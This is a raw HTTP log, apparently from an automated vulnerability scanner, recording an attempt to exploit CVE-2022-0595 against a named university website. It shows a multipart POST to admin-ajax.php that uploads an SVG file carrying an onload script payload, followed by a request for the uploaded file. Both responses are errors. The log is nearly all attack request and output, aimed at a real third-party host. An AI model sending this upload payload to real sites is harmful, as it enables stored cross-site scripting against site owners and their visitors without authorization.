@@ -1,0 +1,105 @@
+[CVE-2022-0595] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au/wp-admin/admin-ajax.php
+
+
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 689
+Content-Type: multipart/form-data; boundary=---------------------------92633278134516118923780781161
+Accept-Encoding: gzip
+
+-----------------------------92633278134516118923780781161
+Content-Disposition: form-data; name="size_limit"
+
+10485760
+-----------------------------92633278134516118923780781161
+Content-Disposition: form-data; name="action"
+
+dnd_codedropz_upload
+-----------------------------92633278134516118923780781161
+Content-Disposition: form-data; name="type"
+
+click
+-----------------------------92633278134516118923780781161
+Content-Disposition: form-data; name="upload-file"; filename="30v0w97eZfZECZeUAYDKVD6l6VP.svg"
+Content-Type: image/jpeg
+
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+-----------------------------92633278134516118923780781161--
+
+[CVE-2022-0595] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au/wp-admin/admin-ajax.php
+
+HTTP/1.1 405 Method Not Allowed
+Connection: close
+Content-Length: 422
+Allow: GET, HEAD, OPTIONS
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:19:00 GMT
+Server: AmazonS3
+Via: 1.1 a4a1a8623588f9bc9a574eed729d35de.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: ti7Z2Awi4qMR_L8SUwcQfSmLOnh1CH2x5tahzRGAKN6q1gRZ7TeJ7g==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>405 Method Not Allowed</title></head>
+<body>
+<h1>405 Method Not Allowed</h1>
+<ul>
+<li>Code: MethodNotAllowed</li>
+<li>Message: The specified method is not allowed against this resource.</li>
+<li>Method: POST</li>
+<li>ResourceType: OBJECT</li>
+<li>RequestId: X4B1Q6EZE12YXCGS</li>
+<li>HostId: JaWssLT0JSG0LhxdY/84dFc6yq4MFem/Nw4gr8PSgAUfkieD6qqFVevW2DedRq536O9oEDjhmio=</li>
+</ul>
+<hr/>
+</body>
+</html>
+
+[CVE-2022-0595] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/30v0w97eZfZECZeUAYDKVD6l6VP.svg
+
+
+GET /wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/30v0w97eZfZECZeUAYDKVD6l6VP.svg HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept-Encoding: gzip
+
+
+[CVE-2022-0595] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/30v0w97eZfZECZeUAYDKVD6l6VP.svg
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 536
+Age: 3
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:59 GMT
+Server: AmazonS3
+Via: 1.1 f8513f043bb0905bbc74a0542f2b9082.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: 3B8N63preUAX1oTjOj5tEFeKiRR39XtFwLnIVi8DgqxU-2gSylnoFw==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<h1>404 Not Found</h1>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: 404.html</li>
+<li>RequestId: 2MP3SAEWT8QB0KK7</li>
+<li>HostId: YxdRLMd/aAVzUvW3shK65D57rdzxEKPJyx3UiJWW9mc17qEQteQvpJ6wrPjHiydr3UhSQnSn7/Q=</li>
+</ul>
+<h3>An Error Occurred While Attempting to Retrieve a Custom Error Document</h3>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: error.html</li>
+</ul>
+<hr/>
+</body>
+</html>
+
